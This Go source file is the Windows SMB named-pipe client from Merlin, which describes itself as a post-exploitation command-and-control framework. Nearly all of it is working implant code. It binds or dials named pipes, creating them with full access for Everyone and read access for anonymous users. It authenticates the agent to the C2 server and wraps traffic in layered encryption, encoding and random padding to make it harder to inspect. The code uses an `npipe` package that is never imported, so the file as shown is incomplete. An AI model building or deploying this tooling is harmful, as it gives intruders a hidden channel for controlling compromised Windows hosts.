//go:build windows

// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2023  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

// Package smb contains a configurable client used for Windows-based SMB peer-to-peer Agent communications
package smb

import (
	// Standard
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"encoding/gob"
	"fmt"
	"io"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
	"unsafe"

	// X Package
	"golang.org/x/sys/windows"

	uuid "github.com/satori/go.uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/messages"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/authenticators"
	"github.com/Ne0nd0g/merlin-agent/authenticators/none"
	"github.com/Ne0nd0g/merlin-agent/authenticators/opaque"
	"github.com/Ne0nd0g/merlin-agent/cli"
	"github.com/Ne0nd0g/merlin-agent/core"
	transformer "github.com/Ne0nd0g/merlin-agent/transformers"
	"github.com/Ne0nd0g/merlin-agent/transformers/encoders/base64"
	gob2 "github.com/Ne0nd0g/merlin-agent/transformers/encoders/gob"
	"github.com/Ne0nd0g/merlin-agent/transformers/encoders/hex"
	"github.com/Ne0nd0g/merlin-agent/transformers/encrypters/aes"
	"github.com/Ne0nd0g/merlin-agent/transformers/encrypters/jwe"
	"github.com/Ne0nd0g/merlin-agent/transformers/encrypters/rc4"
	"github.com/Ne0nd0g/merlin-agent/transformers/encrypters/xor"
)

const (
	BIND    = 0
	REVERSE = 1
)

// Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
type Client struct {
	address       string                       // address is the SMB named pipe the agent will bind to
	agentID       uuid.UUID                    // agentID the Agent's UUID
	authenticated bool                         // authenticated tracks if the Agent has successfully authenticated
	authenticator authenticators.Authenticator // authenticator the method the Agent will use to authenticate to the server
	connection    net.Conn                     // connection the network socket connection used to handle traffic
	listener      net.Listener                 // listener the network socket connection listening for traffic
	listenerID    uuid.UUID                    // listenerID the UUID of the listener that this Agent is configured to communicate with
	paddingMax    int                          // paddingMax the maximum amount of random padding to apply to every Base message
	psk           string                       // psk the pre-shared key used for encrypting messages until authentication is complete
	secret        []byte                       // secret the key used to encrypt messages
	transformers  []transformer.Transformer    // Transformers an ordered list of transforms (encoding/encryption) to apply when constructing a message
	mode          int                          // mode the type of client or communication mode (e.g., BIND or REVERSE)
	sync.Mutex                                 // used to lock the Client when changes are being made by one function or routine
}

// Config is a structure that is used to pass in all necessary information to instantiate a new Client
type Config struct {
	Address      []string  // Address the interface and port the agent will bind to
	AgentID      uuid.UUID // AgentID the Agent's UUID
	AuthPackage  string    // AuthPackage the type of authentication the agent should use when communicating with the server
	ListenerID   uuid.UUID // ListenerID the UUID of the listener that this Agent is configured to communicate with
	Padding      string    // Padding the max amount of data that will be randomly selected and appended to every message
	PSK          string    // PSK the Pre-Shared Key secret the agent will use to start authentication
	Transformers string    // Transformers is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
	Mode         string    // Mode the type of client or communication mode (e.g., BIND or REVERSE)
}

// New instantiates and returns a Client that is constructed from the passed in Config
func New(config Config) (*Client, error) {
	cli.Message(cli.DEBUG, "Entering into clients/smb.New()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Config: %+v", config))
	client := Client{}
	if config.AgentID == uuid.Nil {
		return nil, fmt.Errorf("clients/smb.New(): a nil Agent UUID was provided")
	}
	client.agentID = config.AgentID
	if config.ListenerID == uuid.Nil {
		return nil, fmt.Errorf("clients/smb.New(): a nil Listener UUID was provided")
	}

	switch strings.ToLower(config.Mode) {
	case "smb-bind":
		client.mode = BIND
	case "smb-reverse":
		client.mode = REVERSE
	default:
		client.mode = BIND
	}

	client.listenerID = config.ListenerID
	client.psk = config.PSK

	// Parse Address and validate it
	if len(config.Address) <= 0 {
		return nil, fmt.Errorf("a configuration address value was not provided")
	}
	// \\.\pipe\MerlinPipe
	t := strings.Split(config.Address[0], "\\")
	if len(t) < 5 {
		return nil, fmt.Errorf("clients/smb.New(): invalid SMB address: %s\n Try \\\\.\\pipe\\merlin", config.Address[0])
	}
	if t[1] != "." {
		_, err := net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:445", t[1]))
		if err != nil {
			return nil, fmt.Errorf("clients/smb.New(): there was an error validating the input network address: %s", err)
		}
	}

	switch client.mode {
	case BIND:
		// Can only bind to "."
		client.address = fmt.Sprintf("\\\\.\\pipe\\%s", t[4])
	default:
		client.address = config.Address[0]
	}

	// Set secret for encryption
	k := sha256.Sum256([]byte(client.psk))
	client.secret = k[:]
	cli.Message(cli.DEBUG, fmt.Sprintf("new client PSK: %s", client.psk))
	cli.Message(cli.DEBUG, fmt.Sprintf("new client Secret: %x", client.secret))

	//Convert Padding from string to an integer
	var err error
	if config.Padding != "" {
		client.paddingMax, err = strconv.Atoi(config.Padding)
		if err != nil {
			return &client, fmt.Errorf("there was an error converting the padding max to an integer:\r\n%s", err)
		}
	} else {
		client.paddingMax = 0
	}

	// Authenticator
	switch strings.ToLower(config.AuthPackage) {
	case "opaque":
		client.authenticator = opaque.New(config.AgentID)
	case "none":
		client.authenticator = none.New(config.AgentID)
	default:
		return nil, fmt.Errorf("an authenticator must be provided (e.g., 'opaque'")
	}

	// Transformers
	transforms := strings.Split(config.Transformers, ",")
	for _, transform := range transforms {
		var t transformer.Transformer
		switch strings.ToLower(transform) {
		case "aes":
			t = aes.NewEncrypter()
		case "base64-byte":
			t = base64.NewEncoder(base64.BYTE)
		case "base64-string":
			t = base64.NewEncoder(base64.STRING)
		case "gob-base":
			t = gob2.NewEncoder(gob2.BASE)
		case "gob-string":
			t = gob2.NewEncoder(gob2.STRING)
		case "hex-byte":
			t = hex.NewEncoder(hex.BYTE)
		case "hex-string":
			t = hex.NewEncoder(hex.STRING)
		case "jwe":
			t = jwe.NewEncrypter()
		case "rc4":
			t = rc4.NewEncrypter()
		case "xor":
			t = xor.NewEncrypter()
		default:
			err := fmt.Errorf("clients/smb.New(): unhandled transform type: %s", transform)
			if err != nil {
				return nil, err
			}
		}
		client.transformers = append(client.transformers, t)
	}

	cli.Message(cli.INFO, "Client information:")
	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", &client))
	cli.Message(cli.INFO, fmt.Sprintf("\tAddress: %s", client.address))
	cli.Message(cli.INFO, fmt.Sprintf("\tListener: %s", client.listenerID))
	cli.Message(cli.INFO, fmt.Sprintf("\tAuthenticator: %s", client.authenticator))
	cli.Message(cli.INFO, fmt.Sprintf("\tTransforms: %+v", client.transformers))
	cli.Message(cli.INFO, fmt.Sprintf("\tPadding: %d", client.paddingMax))

	return &client, nil
}

// Initial executes the specific steps required to establish a connection with the C2 server and checkin or register an agent
func (client *Client) Initial() error {
	cli.Message(cli.DEBUG, "Entering clients/smb.Initial() function")

	err := client.Connect()
	if err != nil {
		return fmt.Errorf("clients/smb.Initial(): %s", err)
	}

	// Authenticate
	err = client.Authenticate(messages.Base{})
	return err
}

// Authenticate is the top-level function used to authenticate an agent to server using a specific authentication protocol
// The function must take in a Base message for when the C2 server requests re-authentication through a message
func (client *Client) Authenticate(msg messages.Base) (err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Authenticate(): entering into function with message: %+v", msg))
	var authenticated bool
	// Reset the Agent's PSK
	k := sha256.Sum256([]byte(client.psk))
	client.secret = k[:]

	// Repeat until authenticator is complete and Agent is authenticated
	for {
		msg, authenticated, err = client.authenticator.Authenticate(msg)
		if err != nil {
			return
		}

		// Once authenticated, update the client's secret used to encrypt messages
		if authenticated {
			client.authenticated = true
			var key []byte
			key, err = client.authenticator.Secret()
			if err != nil {
				return
			}
			// Don't update the secret if the authenticator returned an empty key
			if len(key) > 0 {
				client.secret = key
			}
		}

		if msg.Type == messages.OPAQUE {
			// Send the message to the server
			var msgs []messages.Base
			msgs, err = client.SendAndWait(msg)
			if err != nil {
				return
			}

			// Add response message to the next loop iteration
			if len(msgs) > 0 {
				// Don't add IDLE messages, just continue on
				if msgs[0].Type != messages.IDLE {
					msg = msgs[0]
				}
			}
		} else {
			_, err = client.Send(msg)
			if err != nil {
				return
			}
		}

		// If the Agent is authenticated, exit the loop and return the function
		if authenticated {
			return
		}
	}
}

// Connect establish a connection with the remote host depending on the Client's type (e.g., BIND or REVERSE)
func (client *Client) Connect() (err error) {
	client.Lock()
	defer client.Unlock()
	// Check to see if the connection was restored by a different call stack
	if client.connection != nil {
		return nil
	}
	switch client.mode {
	case BIND:
		if client.listener == nil {
			// Create the security descriptor

			// D = Discretionary Access List (DACL)
			// A = Allow
			// FA = FILE_ALL_ACCESS, FR = FILE_GENERIC_READ
			// https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings
			// SY = SYSTEM, BA = BUILT-IN ADMINISTRATORS, CO = CREATOR OWNER, WD = EVERYONE, AN = ANONYMOUS
			// https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings
			// Leave the Owner "O:" off, and it will be set to the user that created the named pipe by default
			// Leave the Group "G:" off, and it will be set to the "None" group by default
			sddl := "D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;CO)(A;;FA;;;WD)(A;;FR;;;AN)"

			var sd *windows.SECURITY_DESCRIPTOR
			sd, err = windows.SecurityDescriptorFromString(sddl)
			if err != nil {
				return fmt.Errorf("clients/smb.Connect(): there was an error converting the SDDL string \"%s\" to a SECURITY_DESCRIPTOR: %s", sddl, err)
			}

			// Create the Security Attributes
			// https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)
			sa := windows.SecurityAttributes{
				Length:             uint32(unsafe.Sizeof(sd)),
				SecurityDescriptor: sd,
				InheritHandle:      1,
			}

			mode := windows.PIPE_ACCESS_DUPLEX | windows.FILE_FLAG_OVERLAPPED | windows.FILE_FLAG_FIRST_PIPE_INSTANCE
			client.listener, err = npipe.NewPipeListener(client.address, uint32(mode), windows.PIPE_TYPE_BYTE, windows.PIPE_UNLIMITED_INSTANCES, 512, 512, 0, &sa)
			if err != nil {
				// Try again without FILE_FLAG_FIRST_PIPE_INSTANCE
				mode = windows.PIPE_ACCESS_DUPLEX | windows.FILE_FLAG_OVERLAPPED
				client.listener, err = npipe.NewPipeListener(client.address, uint32(mode), windows.PIPE_TYPE_BYTE, windows.PIPE_UNLIMITED_INSTANCES, 512, 512, 0, &sa)
				if err != nil {
					return fmt.Errorf("clients/smb.Connect(): there was an error listening on %s: %s", client.address, err)
				}
			}

			cli.Message(cli.NOTE, fmt.Sprintf("Started %s on %s", client, client.address))
		}

		// Listen for initial connection from upstream agent
		cli.Message(cli.NOTE, fmt.Sprintf("Listening for incoming connection..."))
		client.connection, err = client.listener.Accept()
		if err != nil {
			return fmt.Errorf("clients/smb.Connect(): there was an error accepting the connection: %s", err)
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Received new connection from %s", client.connection.RemoteAddr()))
		// Send gratuitous checkin to provide parent Agent with linked agent data
		if client.authenticated {
			_, err = client.Send(messages.Base{ID: client.agentID, Type: messages.CHECKIN})
		}
		return err
	case REVERSE:
		client.connection, err = npipe.Dial(client.address)
		if err != nil {
			return fmt.Errorf("clients/smb.Connect(): there was an error connecting to %s: %s", client.address, err)
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Successfully connected to %s", client.address))
		return nil
	default:
		return fmt.Errorf("clients/smb.Connect(): Unhandled Client mode %d", client.mode)
	}
}

// Construct takes in a messages.Base structure that is ready to be sent to the server and runs all the configured transforms
// on it to encode and encrypt it.
func (client *Client) Construct(msg messages.Base) (data []byte, err error) {
	for i := len(client.transformers); i > 0; i-- {
		if i == len(client.transformers) {
			// First call should always take a Base message
			data, err = client.transformers[i-1].Construct(msg, client.secret)
		} else {
			data, err = client.transformers[i-1].Construct(data, client.secret)
		}
		if err != nil {
			return nil, fmt.Errorf("clients/smb.Construct(): there was an error calling the transformer construct function: %s", err)
		}
	}
	return
}

// Deconstruct takes in data returned from the server and runs all the Agent's transforms on it until
// a messages.Base structure is returned. The key is used for decryption transforms
func (client *Client) Deconstruct(data []byte) (messages.Base, error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Deconstruct(): entering into function with message: %+v", data))
	//fmt.Printf("Deconstructing %d bytes with key: %x\n", len(data), client.secret)
	for _, transform := range client.transformers {
		//fmt.Printf("Transformer %T: %+v\n", transform, transform)
		ret, err := transform.Deconstruct(data, client.secret)
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("clients/smb.Deconstruct(): unable to deconstruct with Agent's secret, retrying with PSK"))
			// Try to see if the PSK works
			k := sha256.Sum256([]byte(client.psk))
			ret, err = transform.Deconstruct(data, k[:])
			if err != nil {
				return messages.Base{}, err
			}
			// If the PSK worked, assume the agent is unauthenticated to the server
			client.authenticated = false
			client.secret = k[:]
		}
		switch ret.(type) {
		case []uint8:
			data = ret.([]byte)
		case string:
			data = []byte(ret.(string)) // Probably not what I should be doing
		case messages.Base:
			//fmt.Printf("pkg/listeners.Deconstruct(): returning Base message: %+v\n", ret.(messages.Base))
			return ret.(messages.Base), nil
		default:
			return messages.Base{}, fmt.Errorf("clients/smb.Deconstruct(): unhandled data type for Deconstruct(): %T", ret)
		}
	}
	return messages.Base{}, fmt.Errorf("clients/smb.Deconstruct(): unable to transform data into messages.Base structure")
}

// Listen waits for incoming data on an established SMB connection, deconstructs the data into a Base messages, and returns them
func (client *Client) Listen() (returnMessages []messages.Base, err error) {
	cli.Message(cli.DEBUG, "clients/smb.Listen(): entering into function")
	// Repair broken connections
	if client.connection == nil {
		cli.Message(cli.NOTE, fmt.Sprintf("Client connection was empty. Waiting for an incoming connection..."))
		err = client.Connect()
		if err != nil {
			err = fmt.Errorf("clients/smb.Listen(): %s", err)
			return
		}
	}

	// Wait for the response
	cli.Message(cli.NOTE, fmt.Sprintf("Listening for incoming messages from %s at %s...", client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))

	var n int
	var tag uint32
	var length uint64
	var buff bytes.Buffer
	for {
		respData := make([]byte, 4096)

		n, err = client.connection.Read(respData)
		cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Listen(): Read %d bytes from connection %s at %s", n, client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
		if err != nil {
			if err == io.EOF {
				err = fmt.Errorf("received EOF from %s, the Agent's connection has been reset", client.connection.RemoteAddr())
				client.connection = nil
				return
			}
			err = fmt.Errorf("there was an error reading the message from the connection with %s: %s", client.connection.RemoteAddr(), err)
			return
		}

		// Add the bytes to the buffer
		n, err = buff.Write(respData[:n])
		if err != nil {
			err = fmt.Errorf("clients/smb.Listen(): there was an error writing %d incoming bytes to the local buffer: %s", n, err)
			client.connection = nil
			return
		}

		// If this is the first read on the connection determine the tag and data length
		if tag == 0 {
			// Ensure we have enough data to read the tag/type which is 4-bytes
			if buff.Len() < 4 {
				cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Listen(): Need at least 4 bytes in the buffer to read the Type/Tag for TLV but only have %d", buff.Len()))
				continue
			}
			tag = binary.BigEndian.Uint32(respData[:4])
			if tag != 1 {
				err = fmt.Errorf("clients/tcp.Listen(): Expected a type/tag value of 1 for TLV but got %d", tag)
				client.connection = nil
				return
			}
		}

		if length == 0 {
			// Ensure we have enough data to read the Length from TLV which is 8-bytes plus the 4-byte tag/type size
			if buff.Len() < 12 {
				cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Listen(): Need at least 12 bytes in the buffer to read the Length for TLV but only have %d", buff.Len()))
				continue
			}
			length = binary.BigEndian.Uint64(respData[4:12])
		}

		// If we've read all the data according to the length provided in TLV, then break the for loop
		// Type/Tag size is 4-bytes, Length size is 8-bytes for TLV
		if uint64(buff.Len()) == length+4+8 {
			cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Listen(): Finished reading data length of %d bytes into the buffer and moving forward to deconstruct the data", length))
			break
		} else {
			cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Listen(): Read %d of %d bytes into the buffer", buff.Len(), length))
		}
	}
	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from connection %s at %s", buff.Len(), client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
	var msg messages.Base
	// Type/Tag size is 4-bytes, Length size is 8-bytes for a total of 12-bytes for TLV
	msg, err = client.Deconstruct(buff.Bytes()[12:])
	if err != nil {
		err = fmt.Errorf("clients/smb.Listen(): there was an error deconstructing the data: %s", err)
		return
	}

	returnMessages = append(returnMessages, msg)
	return
}

// Send takes in a Merlin message structure, performs any encoding or encryption, converts it to a delegate and writes it to the output stream.
// This function DOES not wait or listen for response messages.
func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err error) {
	cli.Message(cli.DEBUG, "Entering into clients/smb.Send()")

	// Set the message padding
	if client.paddingMax > 0 {
		// #nosec G404 -- Random number does not impact security
		m.Padding = core.RandStringBytesMaskImprSrc(rand.Intn(client.paddingMax))
	}

	data, err := client.Construct(m)
	if err != nil {
		err = fmt.Errorf("clients/smb.Send(): there was an error constructing the data: %s", err)
		return
	}

	delegate := messages.Delegate{
		Listener: client.listenerID,
		Agent:    client.agentID,
		Payload:  data,
	}

	// Convert messages.Base to gob
	// Still need this for agent to agent message encoding
	delegateBytes := new(bytes.Buffer)
	err = gob.NewEncoder(delegateBytes).Encode(delegate)
	if err != nil {
		err = fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", messages.String(m.Type), err)
		return
	}

	// Repair broken connections
	if client.connection == nil {
		cli.Message(cli.NOTE, fmt.Sprintf("Client connection was empty. Waiting for an incoming connection..."))
		err = client.Connect()
		if err != nil {
			err = fmt.Errorf("clients/smb.Send(): %s", err)
			return
		}
	}

	// Add in Tag/Type and Length for TLV
	tag := make([]byte, 4)
	binary.BigEndian.PutUint32(tag, 1)
	length := make([]byte, 8)
	binary.BigEndian.PutUint64(length, uint64(delegateBytes.Len()))

	// Create TLV
	outData := append(tag, length...)
	outData = append(outData, delegateBytes.Bytes()...)
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Send(): Added Tag: %d and Length: %d to data size of %d\n", tag, uint64(delegateBytes.Len()), len(outData)))

	cli.Message(cli.NOTE, fmt.Sprintf("Sending %s message to %s at %s", messages.String(m.Type), client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))

	// Write the message
	cli.Message(cli.DEBUG, fmt.Sprintf("Writing message size: %d to: %s", delegateBytes.Len(), client.connection.RemoteAddr()))
	n, err := client.connection.Write(outData)
	if err != nil {
		err = fmt.Errorf("there was an error writing the message to the connection with %s: %s", client.connection.RemoteAddr(), err)
		return
	}

	cli.Message(cli.DEBUG, fmt.Sprintf("Wrote %d bytes to connection %s", n, client.connection.RemoteAddr()))

	return
}

// SendAndWait takes in a Merlin message, encodes/encrypts it, and writes it to the output stream and then waits for response
// messages and returns them
func (client *Client) SendAndWait(m messages.Base) (returnMessages []messages.Base, err error) {
	cli.Message(cli.DEBUG, "Entering into clients/smb.SendAndWait()...")

	// Send
	returnMessages, err = client.Send(m)
	if err != nil {
		err = fmt.Errorf("clients/smb.SendAndWait(): %s", err)
		return
	}

	// Listen
	return client.Listen()
}

// Get is a generic function that is used to retrieve the value of a Client's field
func (client *Client) Get(key string) string {
	cli.Message(cli.DEBUG, "Entering into clients/smb.Get()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s", key))
	switch strings.ToLower(key) {
	case "paddingmax":
		return strconv.Itoa(client.paddingMax)
	case "protocol":
		return client.String()
	default:
		return fmt.Sprintf("unknown client configuration setting: %s", key)
	}
}

// Set is a generic function that is used to modify a Client's field values
func (client *Client) Set(key string, value string) error {
	cli.Message(cli.DEBUG, "Entering into clients/smb.Set()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s, Value: %s", key, value))
	var err error
	switch strings.ToLower(key) {
	case "listener":
		var id uuid.UUID
		id, err = uuid.FromString(value)
		if err != nil {
			return fmt.Errorf("clients/smb.Set(): %s", err)
		}
		client.listenerID = id
	case "paddingmax":
		client.paddingMax, err = strconv.Atoi(value)
	case "secret":
		client.secret = []byte(value)
	default:
		err = fmt.Errorf("unknown tcp client setting: %s", key)
	}
	return err
}

// String returns the type of SMB client
func (client *Client) String() string {
	switch client.mode {
	case BIND:
		return "smb-bind"
	case REVERSE:
		return "smb-reverse"
	default:
		return "smb-unhandled"
	}
}

// Synchronous identifies if the client connection is synchronous or asynchronous, used to determine how and when messages
// can be sent/received.
func (client *Client) Synchronous() bool {
	switch client.mode {
	case BIND:
		return true
	case REVERSE:
		return true
	default:
		return false
	}
}
